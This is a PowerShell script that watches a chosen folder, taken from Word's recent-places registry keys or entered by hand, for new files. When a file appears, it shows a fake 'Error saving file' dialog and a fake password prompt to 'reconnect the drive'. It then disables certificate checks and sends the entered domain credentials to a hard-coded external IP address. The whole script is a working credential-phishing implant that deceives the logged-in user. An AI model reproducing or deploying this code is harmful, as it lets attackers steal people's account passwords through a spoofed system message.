#$ErrorActionPreference = "silentlyContinue"
$confirmOffice="A"
get-eventsubscriber | unregister-event -verbose

###################Functions
function Get-RegistryKeyPropertiesAndValues { 
    $outputs=@()
    $number=1 
    Set-Location 'HKCU:\software\Microsoft\Office\15.0\Word\User MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\ 
    Get-Item . | 
    Select-Object -ExpandProperty property | 
    ForEach-Object {
        $Value = (Get-ItemProperty -Path . -Name $_).$_
        $Value=$Value.split("*")[1]
        $outputs+=$Value
     }
    $outputs = $outputs | Sort-Object -Unique
    $sortedDictionary=@{}
    foreach ( $entry in $outputs) {
        $sortedDictionary.Add($number,$entry)
        $number++
        }
#Pop-Location #Why did I do this? 
return $sortedDictionary 


}


##################################################
############################
#Search for Office based on Registry keys. If match is found will be asked below for confirmation. If no match is found, the user will be prompted if Office is installed. 
if (test-path HKLM:\SOFTWARE\Microsoft\Office\15.0) {
    $officeVersion="Office 2013"
}
elseif (test-path HKLM:\SOFTWARE\Microsoft\Office\12.0) {
    $officeVersion="Office 2010"
	}


#Check complete
############################
#Confirm version of office if match found. If not found, ask if office is installed.
if ($officeVersion){
	$confirmOffice=read-host "Please confirm $officeVersion installed on system? (Y/N)?"
	while ($confirmOffice -ne "Y" -And $confirmOffice -ne "N") {
		write-host "Please enter either Y or N"
		$confirmOffice=read-host "Is $officeVersion installed on system? (Y/N)?"
	}
}

#based on above, either look for MRU keys for WORD, or prompt user for directory to search. 

if ($confirmOffice -eq "Y") {
	#This calls function established above.  This will populate a hash table that will allow us to choose which folder to monitor. 

	$uniqueEntries = Get-RegistryKeyPropertiesAndValues
	$uniqueEntries.GetEnumerator() | Sort-Object -Property "Name" -Unique
	[int]$uniqueEntriesLength=$uniqueEntries.count

	#The user here will choose which entry they want to monitor. 
	[int]$monitorFolder = read-host "Select which directory should be monitored?"
	if ($monitorFolder -gt $uniqueEntriesLength) {
		write-host "Invalid selection, please select again"
			while ($monitorFolder -gt $uniqueEntriesLength) {
				[int]$monitorFolder = read-host "Select which directory should be monitored?"
			}
	}
	$pathToMonitor = $uniqueEntries[$monitorFolder]
    $pathToMonitor1 = $pathToMonitor
	$pathToMonitor = $pathToMonitor.split("\")
	$pathToMonitorDriverLetter=$pathToMonitor[0]
	$pathToMonitorPathRemainder=$pathToMonitor[1..$pathToMonitor.Length] -join "\\"
	$pathToMonitorPathRemainder = "\\" + $pathToMonitorPathRemainder 
}

ElseIf ($confirmOffice -eq "N") {
	$pathToMonitor = read-host "Select which directory should be monitored?"
	$pathToMonitor1 = $pathToMonitor
    $pathToMonitor = $pathToMonitor.split("\")
	$pathToMonitorDriverLetter=$pathToMonitor[0]
	$pathToMonitorPathRemainder=$pathToMonitor[1..$pathToMonitor.Length] -join "\\"
	$pathToMonitorPathRemainder = "\\" + $pathToMonitorPathRemainder 
    $pathToMonitorPathRemainder = $pathToMonitorPathRemainder + "\\"

}
########################################################
#Add code here to do a gci to get the last time the directory was written too. Echo this out. 

if ($pathToMonitor1) 
    {
        $continueScript="no"
        $lastUpdate = get-childitem $pathToMonitor1 | sort-object -descending `
        -property LastWriteTime | select-object LastWriteTime | select -first 1
        $lastUpdate= $lastUpdate | foreach { $_.LastWriteTime}
        
        while ($continueScript -eq "no") 
        {
            $continueScript = read-host "$pathToMonitor1 Last updated $lastupdate. Should we continue Continue?"
        }
    }    




$URLAddress= 'https://200.200.32.134'
#$URLAddress= read-host "What URL should we connect to?"


$localComputerName=$env:COMPUTERNAME
$query = ("Select * from __instanceCreationEvent within 10 Where targetinstance isa 'cim_datafile' and targetInstance.drive='$pathToMonitorDriverLetter' and targetInstance.Path='$pathToMonitorPathRemainder' and targetInstance.__server='$env:computername'  and not targetInstance.Filename LIKE '~$%'")

register-wmievent -query $query -sourceIdentifier "MonitorFiles3" -Debug -action { 
    $global:MyEVT=$event
    write-host  "event occurred" 
    $modFileName=$event.sourceEventArgs.newevent.TargetInstance.filename
    $modExtension=$event.sourceEventArgs.newevent.TargetInstance.extension
    $modDriveLetter=$event.sourceEventArgs.newevent.TargetInstance.Drive
    $modfilenameExtension=$modfilename+"."+$modExtension

    Add-Type -AssemblyName Microsoft.VisualBasic
    [Microsoft.VisualBasic.Interaction]::MsgBox("Unable to reach $modDriveLetter Drive. File $modFileNameExtension was not saved", 'okonly,SystemModal,Information', "Error saving file")
    $cred = $host.ui.promptforcredential("Enter password to reconnect the $modDriveLetter drive",'',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
    if ($cred) {
        $wc = new-object net.webclient;
        $wc.Headers.Add("User-Agent","Wget/1.9+cvs-stae (Red Hat modified)");
        $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
        $wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
        $result=$wc.downloadstring('https://200.200.32.134:443');
        }
    
  }
